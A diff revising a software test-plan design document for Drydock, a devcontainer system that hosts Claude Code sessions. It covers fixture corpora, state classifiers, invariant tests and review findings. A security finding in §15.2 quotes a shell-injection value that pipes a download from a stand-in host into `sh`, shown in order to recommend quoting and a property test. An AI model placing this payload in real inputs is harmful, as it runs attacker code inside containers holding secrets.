@@ -2,9 +2,9 @@
 
 *How a system whose load-bearing properties are mostly things that must **never** happen gets a test suite that actually notices when one of them does.*
 
-**Status** design document, draft v1 · **Date** 2 October 2026
+**Status** design document, draft v2 · **Date** 4 October 2026 · revised against overall draft v6 and the completed Phase 0 spikes — §2, §5.5, §7, §8.2, §8.4, §11.1, §13 and §15 changed
 
-**Supplements** [`../overall/drydock-design.md`](../overall/drydock-design.md) draft v5 · [`../port-forwarding/port-forwarding-design.md`](../port-forwarding/port-forwarding-design.md) draft v3 · reads [`../security-review.md`](../security-review.md) draft v1 and [Spike 00](../spikes/00-shared-credential-volume.md)
+**Supplements** [`../overall/drydock-design.md`](../overall/drydock-design.md) draft v6 · [`../port-forwarding/port-forwarding-design.md`](../port-forwarding/port-forwarding-design.md) draft v3 · reads [`../security-review.md`](../security-review.md) draft v1 and Spikes [00](../spikes/00-shared-credential-volume.md), [01](../spikes/01-login-handshake.md), [02](../spikes/02-rc-restart.md), [03](../spikes/03-claude-env-file.md)
 
 **Out of scope** CI vendor specifics beyond topology · packaging and release mechanics · testing Caddy's or Docker's own correctness
 
@@ -49,9 +49,20 @@ The pure-logic surface is small: a state machine, a handful of parsers, AEAD sea
 > [!WARNING]
 > **Load-bearing fragility**
 >
-> Claude Code's terminal output and a browser's cookie policy are both things Drydock depends on precisely and neither publishes a contract. The login URL, the pasted-code prompt, the `claude.ai/code/<id>` session URLs, the eligibility error on an ineligible account, `/status` output, and the four shapes of `.credentials.json` are all undocumented internals of a pinned version (§11 of the overall design, and Spike 00 consequence F). `SameSite`, `__Host-`, and cross-site `POST` behaviour are browser behaviour the design explicitly notes it "does not control and cannot test in CI" (§13.3).
+> Claude Code's terminal output and a browser's cookie policy are both things Drydock depends on precisely and neither publishes a contract. `SameSite`, `__Host-`, and cross-site `POST` behaviour are browser behaviour the design explicitly notes it "does not control and cannot test in CI" (§13.3). And **everything the four Phase 0 spikes measured is undocumented internals of `2.1.246`** — the refresh lock, the authorize-URL shape and `auth status --json` schema, the reconnect behaviour with its four same-exit-code refusals and three config gates, and the per-command prelude.
 
-The answer for the first is a recorded fixture corpus plus a re-record ritual (§7). The answer for the second is a small real-browser tier (§10) — the design's claim that it cannot be tested in CI is true only of a CI without a browser in it, and one Chromium is cheaper than the alternative, which is finding out from an attacker.
+The answer for the first is a recorded fixture corpus plus a re-record ritual (§7, §11.1). The answer for the second is a small real-browser tier (§10) — the design's claim that it cannot be tested in CI is true only of a CI without a browser in it, and one Chromium is cheaper than the alternative, which is finding out from an attacker.
+
+> [!NOTE]
+> **The scrape surface shrank, and what is left got sharper**
+>
+> Phase 0 moved two things off the terminal entirely. [Spike 01](../spikes/01-login-handshake.md) found `claude auth status --json`, so the expiry watch is a JSON read rather than a `/status` scrape; [Spike 02](../spikes/02-rc-restart.md) found that the durable handle is one **environment id** per workspace plus a `Capacity: N/4` line, not a list of session URLs to keep accurate. What remains is the login handshake's two matches and the discovery tail — and both are *harder* than the design assumed, in ways a naive parser passes:
+>
+> - the authorize URL **wraps mid-token** at ordinary terminal widths, so a line-based regex captures a fragment that looks like a working scrape until someone clicks it;
+> - per-session URLs arrive wrapped in **OSC 8 hyperlink escapes**, so URL and label run together in the byte stream and only an *id* match is unambiguous;
+> - ANSI cursor movement **reprints the status block in place**, so the same line recurs constantly and the tail must be idempotent.
+>
+> Each of those is a test case that a correct-looking implementation fails, which is exactly the class §4.1 exists for.
 
 ### 2.4  The expensive unit is an image build, not a test
 
@@ -64,7 +75,8 @@ A `devcontainer up` against a cold cache is minutes. A container tier that build
 | A real Docker daemon that is not the host's | docker-in-docker in the devcontainer | Already a deliberate choice for path identity (CLAUDE.md); it doubles as test isolation. Containers a test creates are invisible to the host's `docker ps`. |
 | Two genuinely separate registrable domains | `drydock.test` / `drydock-preview.test` | `.test` is reserved and absent from the Public Suffix List, so these are distinct eTLD+1 — which is the whole property PF §10.2 rests on. Without this the browser tier would need two real domains. |
 | Official Feature test harness | `devcontainer features test`, `scenarios.json` | Purpose-built for "this feature must fail loudly under that configuration", which is exactly §11's `postCreate` assertions. |
-| A precedent for re-runnable evidence | `docs/design/spikes/harness/` | Spike 00 already established the pattern: a result is worth little if it cannot be re-checked against a new version. The fixture corpus in §7 is the same idea applied continuously. |
+| Four re-runnable spike harnesses | `docs/design/spikes/harness*/` | Not just a precedent any more — an asset. Each Phase 0 result has a script that re-measures it, which is what turns a Claude Code bump from a guess into the half-hour check in §11.1. The fixture corpus in §7 is the same idea applied continuously. |
+| A machine-readable auth surface | `claude auth status --json` | Spike 01's find. The identity classifier becomes a JSON parser testable against four crafted documents with no PTY, no container, and no account — the cheapest tier reaching the most brittle dependency. |
 | Caddy, `sqlite3`, `socat`, `nc`, `jq`, Node | devcontainer toolchain | The Caddyfile conformance test and the browser tier need no new system dependencies. |
 
 ## 3. Four tiers
@@ -128,6 +140,8 @@ One test covers "redact by default" across the whole system, and it does so by n
 
 Every component test runs with its entire mutable state inside one temp root: the SQLite file, the socket directory, Caddy's log and config, the event store, captured `stdout`/`stderr`, a captured SSE transcript, and the supervisor ring-buffer dump. The scenario seeds uniquely-greppable canaries — a password, a session cookie value, a secret value, a login code, a GitHub token in `ghs_` shape, a preview one-time token, the App private key's PEM body, the secrets master key — drives a full lifecycle, and then greps *the whole tree plus the raw bytes of the SQLite file* for every canary.
 
+Two sinks are not files in that tree and have to be swept explicitly. **`argv` is one**: Spike 03 established that the whole `CLAUDE_ENV_FILE` script text is passed to every command shell as `argv`, so the sweep reads `/proc/<pid>/cmdline` for the session process and its children. **The login code is the other**: it is no longer in the PTY buffer — the prompt does not echo on `2.1.246` — but Drydock receives it over HTTP, so the sweep has to cover the request log, error strings, event rows, and a deliberately triggered panic's output. A sink that is not a file is exactly the sink a tree-walking sweep misses, which is why both are named rather than assumed.
+
 New sinks are covered automatically because they are files in the tree. That property is the point, and it is why the sweep is worth more than a per-sink assertion list that someone has to remember to extend.
 
 Three details that decide whether it works:
@@ -177,7 +191,17 @@ The container manager invokes `devcontainer`; the supervisor invokes `devcontain
 
 ### 5.5  State classification is a pure function
 
-Three places turn foreign text into a Drydock state, and all three must be callable without the thing that produced the text: the scrape of Claude Code's TUI (→ login URL / code prompt / success / failure / session URL / eligibility error), the credential-file read (→ `ok` / `expiring` / `expired` / `blanked` / `absent`), and the `devcontainer up` result (→ `running` / `failed` + the step that failed). Each is `func(input []byte) (state, error)` over a fixture corpus. This is the single highest-value seam in the system, because it converts the two most brittle dependencies into table-driven unit tests.
+Five places turn foreign bytes into a Drydock state, and every one must be callable without the thing that produced the bytes. Each is `func(input []byte) (state, error)` over a fixture corpus, which is what converts the most brittle dependencies in the system into table-driven unit tests.
+
+| Classifier | In | Out |
+|---|---|---|
+| Login handshake | PTY byte stream | authorize URL · at-paste-prompt · `Login successful` · `Invalid code` · timeout |
+| Identity | `auth status --json` **joined with** `.credentials.json` | `ok` · `expiring` · `expired` · `blanked` · `absent` |
+| Startup refusal | one line of `remote-control` stderr | `wait-409` · config error · `awaiting_login` · Drydock bug |
+| Discovery tail | ANSI + OSC 8 byte stream | environment id · session ids · capacity `N/4` |
+| Container result | `devcontainer up --json` | `running` · `failed` + the step that failed |
+
+Two of these are new since draft v1 and both are load-bearing. **Identity needs two sources, not one**: `auth status` reports `loggedIn:false` for a blanked credential *and* for an absent one, and reports `loggedIn:true` for a credential that expired an hour ago — so the verdict comes from the JSON and the countdown from the file, and neither alone is sufficient. **The startup-refusal classifier exists because exit status is not diagnostic**: Spike 02 measured all four refusals exiting `1`, one of which must be retried and three of which must not. A classifier that branches on the exit code is the natural wrong implementation, and it fails by crash-looping against a config error or by giving up on a wait.
 
 ## 6. Fakes and fixtures
 
@@ -189,7 +213,7 @@ A fake encodes a belief about a real system, and the belief rots. Every fake the
 |---|---|---|---|
 | `fakedevcontainer` | the `devcontainer` CLI | one container test runs the real CLI and asserts the `{outcome, containerId, remoteUser}` JSON shape, the `--id-label` lookup behaviour, and that `--additional-features` composes rather than replaces | container tier, every run |
 | `fakegithub` | `api.github.com` **and** the git smart-HTTP remote | a manual test against a real test App on a throwaway repo, asserting the installation-token request/response shape and `repository_ids` + `permissions` enforcement | ritual, on GitHub API change or quarterly |
-| `fakeclaude` | the `claude` binary, on a PTY | re-recording the fixture corpus from the pinned version | ritual, on every Claude Code bump (§11.1) |
+| `fakeclaude` | the `claude` binary, on a PTY | the four Phase 0 harnesses, which drive the real binary, plus re-recording the corpus from it | ritual, on every Claude Code bump (§11.1) |
 | `fakeupstream` | a repo's dev server | none needed — it is a recording echo server, not a belief about anything | — |
 
 ### 6.2  `fakedevcontainer`
@@ -218,7 +242,9 @@ A binary that replays a recorded transcript onto a PTY and reads stdin. Three pr
 - **The PTY width is a test parameter.** A login URL line-wrapped at 80 columns is the realistic failure the scraper must survive; narrow and wide are separate cases.
 - **It asserts on what it receives.** The login handshake test is only meaningful if `fakeclaude` confirms the pasted code arrived on its stdin, exactly once, with the expected framing.
 
-Scripted modes: successful login; login timeout; login failure; immediate exit with the account-ineligibility signature; serving, then emitting session URLs on a delay; crash-loop; emit a `claude.ai/code/<id>`-shaped URL *as model output rather than as a server announcement* (the false-positive case §7 cares about).
+Scripted modes, now shaped by what Spikes 01 and 02 measured: successful login; login timeout; `Invalid code` *while staying at the prompt so another code can be submitted*; the four startup refusals, all exiting `1`; a `409` refusal that persists for a configurable duration; a **hang** on the `Enable Remote Control? (y/n)` prompt; serving, then emitting session ids on a delay, wrapped in OSC 8 escapes and reprinted in place by cursor movement; `auth status --json` in each of its four shapes; crash-loop; and a `session_…`-shaped id emitted *as model output rather than as a server announcement* (the false-positive case §7 cares about).
+
+The hang mode deserves its own note: it is the only failure in the set that is not an error but an absence, so its test asserts a **timeout** rather than a message. A suite with no hang fixture passes happily against the exact bug Spike 02 found — a missing `remoteDialogSeen` looking like a wedge rather than a missing key.
 
 ### 6.5  Fixture repos, and the Feature's own suite
 
@@ -244,22 +270,56 @@ The Feature itself gets the official harness rather than a bespoke one: `devcont
 
 ## 7. The scrape contract
 
-The most brittle thing in the system gets the most mechanical treatment. `test/fixtures/transcripts/claude-<version>/` holds raw recorded PTY output, one file per scenario, each with a header comment naming the version, the date, the command, and the PTY width it was recorded at.
+The most brittle thing in the system gets the most mechanical treatment. `test/fixtures/transcripts/claude-<version>/` holds raw recorded PTY bytes — escapes intact, never a cleaned-up transcript — one file per scenario, each with a header naming the version, the date, the command, and the PTY width it was recorded at.
+
+Phase 0 changed what belongs in here. The expiry watch left the corpus for JSON (§5.5), and three mechanical hazards joined it.
+
+#### Login handshake (Spike 01)
 
 | Fixture | Must yield |
 |---|---|
-| `login-url-wide`, `login-url-narrow-80col` | the same URL from both — the wrapped case is the one that breaks |
-| `login-code-prompt` | the "paste code" state, so the UI knows to accept input |
-| `login-success`, `login-failure`, `login-timeout` | three distinct terminal states |
-| `session-url-single`, `session-url-many`, `session-url-delayed` | one, several, and one arriving minutes into the stream (the continuous-tail requirement in §8) |
-| `session-url-in-model-output` | **no** session row — a `claude.ai/code/<id>` URL the model printed is not a server announcement |
-| `remote-control-ineligible` | `awaiting_login`, with zero restart attempts |
-| `connection-lost` | `degraded` |
-| `status-ok`, `status-expiring`, `status-expired` | three states plus a parsed `expires_at` |
-| `credentials-{ok,expiring,expired,blanked,absent,corrupt}.json` | six states; `blanked` must never classify as `expired` (Spike 00, consequence A) |
-| ANSI-heavy variants of the two URL cases | identical results after escape stripping |
+| `login-url-1000col` | the complete authorize URL |
+| `login-url-200col` | **the same URL** — it wraps mid-token at this width, and a line-based regex captures a fragment |
+| `login-url-ansi` | the same again after escape stripping |
+| `login-code-prompt` | the at-paste-prompt state, so the UI knows to accept input |
+| `login-invalid-code` | `Invalid code`, *and* still at the prompt — a wrong code needs no teardown and the same URL stays valid |
+| `login-success-{plain,period,press}` | all three match — `Login successful` is matched as a **prefix**, never as a whole line |
+| `login-timeout` | the third terminal state |
 
-Two things this does **not** prove, stated plainly because the gap is where the bug will be: the corpus proves the parser handles the recorded output, not that the recorded output is still what Claude Code emits. Only a live run does that, which is why re-recording is a ritual (§11.1) rather than a test. And a regex that is too permissive passes every positive fixture; the negative fixtures (`session-url-in-model-output`, and a corpus of ordinary agent chatter that must match nothing) are the half that catches it.
+The URL assertion is the one worth stating precisely, because a fragment passes a naive test: assert the captured string is a **complete** URL — it parses, it carries the expected query-parameter set, and its length is in the ~450-character range — not merely that the regex matched something. "Looks like a working scrape until someone clicks the link" is a failure mode a `!= ""` assertion cannot see.
+
+The code-shape check is a unit test with no fixture at all: `^[^#\s]+#[^#\s]+$` against a table of a bare code, a bare state, two separators, embedded whitespace, and the valid form. Spike 01's point is that Drydock validates this *before* writing to the PTY, so a truncated paste becomes an instant precise error instead of a terminal round-trip.
+
+#### Discovery tail (Spike 02)
+
+| Fixture | Must yield |
+|---|---|
+| `env-status-block` | the environment id, and `Capacity: 1/4` as the session count |
+| `session-url-osc8` | the session id — matched as `session_[A-Za-z0-9]+`, never from the URL |
+| `session-url-osc8-urlmatch` | **negative**: a URL-based match captures the label too. The fixture exists to keep the id-matching rule from being "simplified" later |
+| `status-block-repainted` | *one* row from N in-place reprints — the tail is idempotent, upsert by id |
+| `session-ids-delayed` | ids arriving minutes into the stream still upsert |
+| `session-id-in-model-output` | **no** row — a `session_…` id the model printed is not a server announcement |
+
+That last fixture matters more than it did in draft v1. Matching bare ids rather than URLs is the correct rule, and it also widens the false-positive surface: an agent discussing its own session id now looks exactly like an announcement. The negative corpus is the half of the contract that catches a too-permissive pattern.
+
+#### Startup refusals (Spike 02)
+
+Four fixtures, one per signature — `409` / `already served by a terminal`, `Workspace not trusted`, `Unable to determine your organization`, `cannot be used with --spawn` — each paired with its verdict from §5.5. **All four exit `1`**, and the test asserts that: feed the classifier each fixture with exit status `1` and require four distinct verdicts, which is a test the natural exit-code implementation fails.
+
+#### Identity (Spike 01)
+
+Four golden `auth status --json` documents (absent, valid, expired, blanked) joined with six `.credentials.json` shapes (`ok`, `expiring`, `expired`, `blanked`, `absent`, `corrupt`). Three joins carry the whole point of §7.3 and each is a separate assertion:
+
+- `loggedIn:true` with an `expiresAt` in the past → **`expired`**, taken from the file. A classifier that trusts `auth status` alone reports a healthy login.
+- `loggedIn:false` with a file present and empty token strings → **`blanked`**: every workspace just died, "signed out, sign in again".
+- `loggedIn:false` with no file → **`absent`**: nobody has ever signed in. Same JSON as the row above, different words, and the file read is the only thing separating them.
+
+#### What the corpus does not prove
+
+Stated plainly because the gap is where the bug will be. The corpus proves the parser handles the recorded bytes, not that the bytes are still what Claude Code emits — only a live run does that, which is why re-recording is a ritual (§11.1) rather than a test. Phase 0 makes that re-record cheap: four harnesses already drive the real binary, so the ritual is running them, not building them.
+
+One assertion in the corpus is **reasoned rather than observed**, and the design says so: Spike 01 drove the handshake through an invalid code, so the `Login successful` strings come from `grep` over the binary rather than from a completed login. The three success fixtures are therefore hand-written until `harness-01-login/run.sh login` is run with a human in a browser. A hand-written fixture asserting a hand-written expectation proves only that the regex matches itself — so that row stays flagged in the corpus header until it is recorded, and §13 keeps it on Phase 5's critical path.
 
 ## 8. Invariant → test map
 
@@ -299,6 +359,11 @@ The table CLAUDE.md's invariant list and §13.5 / PF §10.7 imply. Columns: the 
 | Values stay out of `argv`, `ps`, `docker inspect` | container | after supervisor start, none contain the canary | the session process's own `environ` does |
 | `secret_access` is written per fetch | component | one row per `GET-SECRETS` | the fetch returned the secret |
 | Rotation marks staleness, never restarts | component | rotate; assert workspace flagged and the supervisor pid unchanged | the flag says which kind of stale |
+| `export` is silent on success | component | stdout and stderr are both **zero bytes** | the variables were nonetheless exported into the command's environment |
+| `export` fails closed | component | on a broker outage it `exit`s non-zero; the Bash command aborts, and a bare `echo` returns the prelude's status | with the broker up, the same command runs normally |
+| The prelude script is one constant line | container | the file's text equals a fixed constant, contains no resolved value, and is never rewritten for the life of the workspace | rotating a grant still reaches the next command, with the text untouched |
+| Values stay out of `argv` | container | the canary appears in no `/proc/<pid>/cmdline` of the session process or any command shell — though the script *text* does | the value is present in the command's environment |
+| The broker is cheap per call | component | N exports make zero GitHub requests and run no KDF per call — decrypt happens at grant resolution | each export still returns the right values |
 
 ### 8.3  GitHub credentials
 
@@ -327,6 +392,17 @@ The table CLAUDE.md's invariant list and §13.5 / PF §10.7 imply. Columns: the 
 | Sessions are observed continuously | component | a URL emitted minutes in still upserts; a model-printed URL does not | a server-announced URL does |
 | The PTY buffer is never persisted verbatim | component | *sweep* for the login-code canary after a scripted handshake | `fakeclaude` confirms the code arrived on stdin |
 | Login has a deadline and a cancel | component | injected clock past 5 min → handshake killed, Drydock still serving | a cancel mid-handshake frees the PTY and a new login starts |
+| A wrong code does not need a teardown | component | submit `Invalid code`, then a second code on the same PTY | the second submission reaches the prompt and the original URL is still valid |
+| The feature writes all three `.claude.json` keys | container (Feature scenarios) | one scenario per missing key: absent trust → `Workspace not trusted`; absent `oauthAccount` → the organization error; absent `remoteDialogSeen` → **a hang, asserted as a timeout** | with all three present, a headless start reaches `serving` |
+| A copied credential is not enough | container | a container holding only `.credentials.json` makes a model request fine and **refuses** Remote Control | the same container on the shared volume starts |
+| One `/workspace` trust record serves every container | container | a second workspace on the shared volume needs no new trust write | the first container's write is what satisfies it |
+| `SIGTERM` first, `SIGKILL` only on timeout | container | a clean stop prints `Environment preserved` and the next start is accepted immediately | a `SIGKILL` of a session-less server is what produces the `409` below |
+| A `409` is a wait, not a crash | component | it gets its own state, is retried on a flat interval, and **does not spend the restart budget**; the UI says *waiting* | a genuine crash does consume the budget and parks in `degraded` |
+| Nothing is coded against the 409 duration | component | the fake refuses for a caller-chosen span; no constant appears in the assertion | the supervisor starts as soon as the fake stops refusing |
+| The environment id survives a restart | container | after `SIGTERM` and after `SIGKILL`, the id and the card link are unchanged | sessions reconnect and capacity is preserved |
+| Capacity counts the pre-created session | component | `--capacity 4` yields three on-demand sessions | the fourth is refused, and the count shown matches `Capacity: N/4` |
+| Exit status is never the discriminator | unit | four refusal fixtures, all exit `1`, four distinct verdicts | each verdict drives the right action |
+| Version pin agrees across the repo | unit | the version string in CLAUDE.md, the Feature, and **all four** spike reports match | the pinned binary in the container reports it too |
 
 ### 8.5  Previews
 
@@ -372,7 +448,7 @@ Stated rather than quietly dropped. Each is a review gate, a ritual, or an upstr
 | Nothing stops a workspace automatically | the absence of code; a grep for timers is theatre | review gate on any PR touching lifecycle |
 | No re-auth prompt on destructive routes | absence again | review gate |
 | Remote Control genuinely needs a full login, not a setup token | an upstream fact about Anthropic's service | §2.1 is documentation; the reserved-name test covers our half |
-| The shared credential volume stays safe on a future Claude Code version | undocumented internals | re-run Spike 00 (§11.1) |
+| Any Phase 0 behaviour stays true on a future Claude Code version | undocumented internals of `2.1.246` | re-run all four harnesses (§11.1) |
 | `reach` is filled in honestly | a human judgement about prose | the required field is the control; nothing more is available |
 | The operator does not type the password into a preview | human behaviour | PF §10.5's UX measures; the browser tier proves the origin is visibly different |
 | A granted secret stays inside the container | §10.4 says plainly there is no technical control | nothing. This is the design's stated residual risk, not a test gap |
@@ -438,15 +514,24 @@ Triggered by an event, never by a commit. Each is a file in `test/rituals/` with
 
 ### 11.1  Claude Code version bump
 
-The heaviest one, because the pin guards two separate things (terminal shapes and refresh safety) and both are undocumented.
+The heaviest one, and heavier than draft v1 assumed: the pin now guards four measured behaviours, not two. Everything the Phase 0 spikes established — the refresh lock, the authorize-URL shape and `auth status --json` schema, the reconnect behaviour with its four refusals and three config gates, and the per-command prelude — is undocumented internals of one version.
 
 1. Bump the pin in the Feature. Build the test base image.
-2. **Re-record the whole transcript corpus** (§7) at both PTY widths against the new version, into `claude-<newversion>/`.
-3. `diff` old against new. A diff in a URL line, a prompt string, the ineligibility signature, or `/status` output is a scraper change, not a fixture update — make the parser handle both and keep both corpora.
-4. Run the unit scrape tests against **both** corpora. The old one stays until a version is no longer deployable.
-5. Re-run `docs/design/spikes/harness/` in full — all four tests — and update Spike 00's "verified against" line and verdict.
+2. **Re-run all four harnesses** — named in the table below — and update each spike's "verified against" line and verdict.
+3. **Re-record the transcript corpus** (§7) at both PTY widths into `claude-<newversion>/`, and re-capture the four `auth status --json` shapes.
+4. `diff` old against new. A change in the URL pattern, a prompt string, a refusal signature, the OSC 8 wrapping, or the `auth status` schema is a **parser change**, not a fixture update — make the parser handle both and keep both corpora.
+5. Run the unit scrape tests against **both** corpora. The old one stays until a version is no longer deployable.
 6. Run the container tier.
-7. Update the version in CLAUDE.md, the Feature, and the spike report *in the same commit*; the consistency test in §8.4 enforces that they agree.
+7. Update the version in CLAUDE.md, the Feature, and **all four** spike reports *in the same commit*; the consistency test in §8.4 enforces that they agree.
+
+| Harness | Re-measures |
+|---|---|
+| `docs/design/spikes/harness/` | 00 — the refresh lock, write atomicity, the stale-lock window |
+| `docs/design/spikes/harness-01-login/` | 01 — the authorize URL and its wrapping, the code shape, the `auth status --json` schema |
+| `docs/design/spikes/harness-02-restart/` | 02 — reconnection, the `409` window, the three config gates, OSC 8 wrapping |
+| `docs/design/spikes/harness-03-env-file/` | 03 — the per-command prelude, `argv` composition, `exit` semantics |
+
+Step 2 before step 3 is deliberate. The harnesses exercise the real binary and will fail loudly on a behavioural change; the corpus only records whatever came out. Re-recording first would quietly bake a regression into the fixtures and leave the parser tests green.
 
 ### 11.2  `devcontainer` CLI or Docker bump
 
@@ -494,12 +579,12 @@ The fast lane is the gate. Deep and browser are allowed to be slower than a huma
 
 | Phase | "Done when" becomes | Also must exist |
 |---|---|---|
-| **0 — Spikes** | the transcript corpus exists and the scrape parsers pass against it; the browser-harness spike (§10.1) has an answer | `fakeclaude`, and the §5 seams decided on paper |
+| **0 — Spikes** | **Done** — four harnesses and four reports exist. What this plan still owes it: the transcript corpus recorded from them, the scrape parsers passing against it, and an answer to the browser-harness spike (§10.1) | `fakeclaude` shaped by what 01–03 measured, and the §5 seams decided on paper |
 | **1 — Front door** | **the whole of §8.1**, driven off the route table | the route table as data (§5.1), the injected clock (§5.2), the canary sweep (§4.2), the Caddyfile conformance test (§3.2), and the `rebind` / `csrf-*` / `brute-force` scenarios |
 | **2 — Walking skeleton** | §8.6 in full, including the amnesia test and the three kill -9 cases | `fakedevcontainer` and its contract test; the fixture repos; the test label namespace (§5.4) |
 | **3 — Credentials** | §8.3 in full — and the negative half is the phase's actual deliverable: a container that **fails** to touch any other repo | `fakegithub` with the git remote; the shim tests (§6.6); `cross-broker` |
 | **4 — Secrets** | §8.2 in full, plus the stated pair: granted repo's suite passes, ungranted repo's fails | the §15.1/§15.2 findings answered, with `secret-injection` as their regression test |
-| **5 — Claude** | §8.4 in full against `fakeclaude`; the real half is ritual §11.4 | the bump ritual written down before the first bump, not after |
+| **5 — Claude** | §8.4 in full against `fakeclaude` — including the three config gates, the hang, and the `409` wait; the real half is ritual §11.4 | the bump ritual written down before the first bump, not after; the two unverified Phase 0 assertions closed (`Login successful` recorded live, worktree trust tested) |
 | **6 — Livability** | the §12 failure-mode messages, each asserted by the test that provokes its failure | the cap-refusal and disk pre-flight rows of §8.6 |
 | **Previews** (after Phase 2) | §8.5 and the browser tier; PF §14.1's first open question answered and struck | the local CA harness, `fakeupstream` |
 
@@ -518,6 +603,8 @@ Two notes on ordering. Phase 1 carries a disproportionate share of the infrastru
 ## 15. Design questions this plan surfaced
 
 Writing down how each invariant would be *proved* turned up five places where the design as written admits a wrong implementation. Three are security findings. They are recorded here rather than silently patched into the parent documents, because the fix is a design decision, not a test.
+
+All five were **re-validated against draft v6** on 4 October 2026 and all five still stand. Two changed in the process: §15.2 got worse, because v6 adopted the per-command prelude as *the* secrets mechanism, and §15.3 grew from one missing column to three states the schema cannot hold.
 
 ### 15.1  `GET-SECRETS` is a line protocol and secret values are arbitrary bytes
 
@@ -542,31 +629,35 @@ The same framing concern applies to the `count=` line: a value containing a newl
 
 **Recommendation.** Either reject control characters (`\n`, `\r`, NUL) in secret values at write time — simplest, and consistent with validating names on write — or make the protocol framed rather than line-oriented (length-prefixed values, or base64). Prefer rejecting at write: it keeps the "small enough that the in-container client is a shell script with `nc`" property §5 argues for. Then assert the count matches the lines received, and fail the fetch rather than the parse.
 
-### 15.2  `eval "$(drydock-secrets export)"` is a shell-injection sink
+### 15.2  `eval "$(drydock-secrets export)"` is a shell-injection sink — and v6 made it worse
 
-§8 and §10.3 both run the supervisor as:
+Draft v1 filed this against §8's supervisor start, where it fires once per `exec`. Draft v6 adopted "the environment pulls" as **the** delivery mechanism on the strength of [Spike 03](../spikes/03-claude-env-file.md), so the same `eval` now runs in a fresh shell **before every Bash command the agent issues**, for the life of the session. The sink did not move; its rate went from once per supervisor start to once per command, and the mechanism carrying it is now the primary one rather than an unverified option.
 
-```bash
-bash -lc 'eval "$(drydock-secrets export)" && cd /workspace && exec claude remote-control …'
-```
-
-If `export` emits `NAME=value` without quoting, a secret value of
+If `export` emits `NAME=value` without quoting, a stored value of
 
 ```text
 '; curl -s evil.example/x | sh; '
 ```
 
-executes as the remote user in the container, with the broker socket mounted, before `claude` ever starts. The injection is in the *value*, so it arrives through the ordinary `PUT /api/secrets/:name` path.
+executes as the remote user in the container, with the broker socket mounted. The injection rides in the *value*, so it arrives through the ordinary `PUT /api/secrets/:name` path, and under v6 it re-executes on every tool call rather than waiting for a restart.
 
-This is lower severity than it looks — the attacker must already be able to write a secret, which means a signed-in session, and §13.4 grants a signed-in session a great deal already. But it converts "can store a secret" into "can run code in every granted container at next supervisor start", which is a boundary the design otherwise maintains, and it is one line to close.
+Severity is still bounded by who can write a secret: that requires a signed-in session, and §13.4 already grants a signed-in session a great deal. What it converts is "can store a secret" into "runs code in every granted container, continuously" — a boundary the design otherwise maintains, and one line to close.
 
-**Recommendation.** `export` emits single-quoted values with embedded single quotes escaped (`'\''`), and the shim is covered by a property test: for arbitrary byte strings, `eval "$(drydock-secrets export)"` leaves the environment variable byte-identical to what was stored. That property test is the one place in this document where fuzzing clearly earns its keep.
+**Recommendation.** `export` emits single-quoted values with embedded single quotes escaped (`'\''`), covered by a property test: for arbitrary byte strings, `eval "$(drydock-secrets export)"` leaves the variable byte-identical to what was stored. That is the one place in this document where fuzzing clearly earns its keep. Note that §8.2's new `argv` row is *not* a substitute — Spike 03's finding that values stay out of `ps` holds precisely because the helper is invoked rather than inlined, and says nothing about whether its output is safe to `eval`.
 
-### 15.3  `claude_identity` cannot store the state §7.3 requires
+### 15.3  Three states the prose now requires and the schema cannot hold
 
-`GET /api/auth/claude` returns one of `ok` / `expiring` / `expired` / `absent`, and §7.3 plus Spike 00 consequence A add a fifth, *blanked*, with its own message. The table stores `expires_at` and `last_checked_at` and no state column. Blanked is technically inferable (`expiresAt: 0`), but an inference spread across readers is how "signed out, sign in again" quietly becomes "expired three weeks ago".
+Draft v1 filed one missing column. Draft v6 added two more of the same kind: §4's schema was not touched by the Phase 0 revisions, so three states the new prose depends on have nowhere to live. Each fails the same way — an inference spread across readers instead of a column — and each is invisible to a test at the database boundary, which is the cheapest place to catch it.
 
-**Recommendation.** Add `state TEXT` to `claude_identity`, written by the poller from the pure classifier in §5.5. It makes the distinction storable, testable at the database boundary, and visible in the one place someone debugging at 2am will look.
+| Required by | Needs | Today |
+|---|---|---|
+| §7.3's five identity states, incl. *blanked* vs *absent* | `claude_identity.state` | `expires_at`, `last_checked_at`, and a comment still reading `-- parsed from /status` — a mechanism v6 replaced with `auth status --json` plus a file read |
+| §8's "store the environment id in `workspace`" | `workspace.environment_id` | no column. The durable handle Spike 02 identified, and the card's only link, has nowhere to go |
+| §8's "the `409` deserves its own state" | a sixth value in `supervisor.state` | the enum is `starting\|awaiting_login\|serving\|degraded\|exited`. A wait that must not spend the restart budget cannot be distinguished from a failure that should |
+
+The third is the one with teeth. §8 is explicit that a `409` is a wait, that the UI must say *waiting* rather than *failed*, and that it must not consume the crash-restart budget — and with no state to record it in, the natural implementation stores `degraded` and a `last_error`, which is exactly the conflation the section warns against.
+
+**Recommendation.** Three columns, one commit: `claude_identity.state`, `workspace.environment_id`, and `waiting_registration` added to the `supervisor.state` enum. Fix the stale `/status` comment in the same pass. Each is then written by a classifier from §5.5 and asserted by the schema snapshot test in §8.2 — a column that exists is a state a test can read.
 
 ### 15.4  A retired preview slug can be reissued
 
@@ -584,9 +675,10 @@ Covered as a seam in §5.4, repeated here because it is a change to the parent d
 
 ### 16.1  Still open
 
-1. **Can a headless Chromium be made to trust a local CA cleanly enough for `__Host-` semantics?** §10.1. If not, the browser tier either grows a real domain and a real certificate or shrinks to the handshake and HMR tests, losing the three cookie assertions — which are the ones PF §14.1 actually asked for. Spike it with Phase 0.
-2. **Is `devcontainer features test` enough for the hostile scenarios, or does the Feature need a bespoke harness?** The official harness is scenario-per-config, which fits §11's assertions well; whether it can assert on a *build failure's message* rather than only on a passing build is the thing to check. If it cannot, the hostile scenarios move into the container tier as direct `up` invocations.
-3. **How warm can the container tier's cache be kept in CI?** The budget in §3 assumes a shared base image survives between runs. On a self-hosted runner it does, trivially; the question is whether the deep lane stays under ten minutes on a cold runner after a dependency bump, or whether it needs an explicit image-cache step.
+1. **Can a headless Chromium be made to trust a local CA cleanly enough for `__Host-` semantics?** §10.1. If not, the browser tier either grows a real domain and a real certificate or shrinks to the handshake and HMR tests, losing the three cookie assertions — which are the ones PF §14.1 actually asked for. It is the one spike this plan still wants, now that Phase 0 is otherwise closed.
+2. **Does a `--spawn worktree` session need its own trust record?** Inherited from v6 §11, which measured trust as keyed on the absolute path and left this untested. It is a test-design problem as much as a design one: it fails only for the *second and later* sessions in a workspace, so a container test that opens one session passes and the suite never sees it. The fixture has to open two, which means `fakeclaude` needs a spawn mode that reports a worktree path — cheap, but only if it is built before Phase 5 rather than discovered during it.
